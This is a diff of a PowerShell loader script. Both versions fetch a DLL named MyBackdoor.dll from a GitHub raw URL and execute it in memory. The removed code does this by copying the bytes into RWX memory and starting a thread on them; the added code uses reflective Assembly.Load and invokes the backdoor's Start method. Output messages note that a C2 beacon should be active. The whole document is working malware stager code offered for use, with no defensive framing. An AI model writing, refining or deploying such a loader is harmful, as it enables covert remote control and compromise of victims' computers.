@@ -1,4 +1,4 @@
-# loader.ps1
+# loader.ps1 - Managed Assembly Loader
 if ([Environment]::Is64BitProcess) {
     Write-Host "[*] Running in 64-bit PowerShell"
 } else {
@@ -6,9 +6,9 @@ if ([Environment]::Is64BitProcess) {
 }
 Write-Host "[*] Running under: $((Get-Host).Version) / $($PSVersionTable.PSEdition)"
 
-# 1) Download the DLL bytes with error handling
+# 1) Download the assembly bytes with error handling
 $payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
-Write-Host "[*] Downloading payload from $payloadUrl"
+Write-Host "[*] Downloading managed payload from $payloadUrl"
 try {
     $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
     Write-Host "[*] Downloaded $($dllBytes.Length) bytes"
@@ -17,64 +17,81 @@ try {
     exit 1
 }
 
-# 2) Fix the Add-Type compilation with proper CompilerParameters
-Write-Host "[*] Compiling ReflectiveLoader for x64"
+# 2) Validate payload format
+Write-Host "[*] Validating payload format..."
+if ($dllBytes[0] -eq 0x4D -and $dllBytes[1] -eq 0x5A) {
+    Write-Host "[*] Valid PE header detected"
+} else {
+    Write-Error "Invalid PE format - expected managed assembly"
+    exit 1
+}
+
+# 3) Compile the managed assembly loader
+Write-Host "[*] Compiling ManagedLoader for x64"
 $compilerParams = New-Object System.CodeDom.Compiler.CompilerParameters
 $compilerParams.GenerateInMemory = $true
 $compilerParams.CompilerOptions = "/platform:x64"
 $compilerParams.ReferencedAssemblies.Add("System.dll")
-$compilerParams.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll")
+$compilerParams.ReferencedAssemblies.Add("System.Runtime.dll")
 
 Add-Type -Language CSharp -CompilerParameters $compilerParams -TypeDefinition @"
 using System;
-using System.Runtime.InteropServices;
-public static class ReflectiveLoader {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAlloc(
-        IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool VirtualProtect(
-        IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateThread(
-        IntPtr lpThreadAttributes, UIntPtr dwStackSize,
-        IntPtr lpStartAddress, IntPtr lpParameter,
-        uint dwCreationFlags, out uint lpThreadId);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern uint WaitForSingleObject(
-        IntPtr hHandle, uint dwMilliseconds);
-    
-    public static void LoadAndRun(byte[] rawAssembly) {
-        // Allocate RWX memory
-        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawAssembly.Length, 0x3000, 0x40);
-        if (addr == IntPtr.Zero) {
-            throw new Exception("VirtualAlloc failed");
+using System.Reflection;
+using System.Threading;
+public static class ManagedLoader {
+    public static void LoadAndExecute(byte[] assemblyBytes) {
+        try {
+            // Load the managed assembly
+            Assembly asm = Assembly.Load(assemblyBytes);
+            Console.WriteLine("[*] Assembly loaded successfully");
+            
+            // Find the Entry type and Start method from your C# payload
+            Type entryType = asm.GetType("MyBackdoor.Entry");
+            if (entryType == null) {
+                throw new Exception("MyBackdoor.Entry type not found in assembly");
+            }
+            Console.WriteLine("[*] Found Entry type");
+            
+            MethodInfo startMethod = entryType.GetMethod("Start", BindingFlags.Public | BindingFlags.Static);
+            if (startMethod == null) {
+                throw new Exception("Start method not found in Entry type");
+            }
+            Console.WriteLine("[*] Found Start method");
+            
+            // Execute the Start method in a separate thread to prevent blocking
+            Thread executionThread = new Thread(() => {
+                try {
+                    Console.WriteLine("[*] Invoking Start method...");
+                    startMethod.Invoke(null, null);
+                } catch (Exception ex) {
+                    Console.WriteLine("[!] Execution thread error: " + ex.Message);
+                }
+            });
+            
+            executionThread.IsBackground = true;
+            executionThread.Start();
+            
+            Console.WriteLine("[*] Payload thread started successfully");
+            
+        } catch (Exception ex) {
+            throw new Exception("Assembly execution failed: " + ex.Message);
         }
-        
-        // Copy shellcode to allocated memory
-        Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);
-        
-        // Create thread to execute shellcode
-        uint threadId;
-        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out threadId);
-        if (hThread == IntPtr.Zero) {
-            throw new Exception("CreateThread failed");
-        }
-        
-        // Wait for completion
-        WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
 }
 "@
 
-# 3) Invoke it with error handling
-Write-Host "[*] Reflectively loading payload into memory"
+# 4) Execute the managed payload
+Write-Host "[*] Loading managed C# assembly"
 try {
-    [ReflectiveLoader]::LoadAndRun($dllBytes)
-    Write-Host "[*] Execution completed"
+    [ManagedLoader]::LoadAndExecute($dllBytes)
+    Write-Host "[*] Payload deployed successfully"
+    Write-Host "[*] C2 beacon should be active - check your console"
+    
+    # Keep the loader alive briefly to allow payload initialization
+    Start-Sleep -Seconds 3
+    Write-Host "[*] Loader complete - payload running independently"
+    
 } catch {
     Write-Error "Execution failed: $_"
+    exit 1
 }
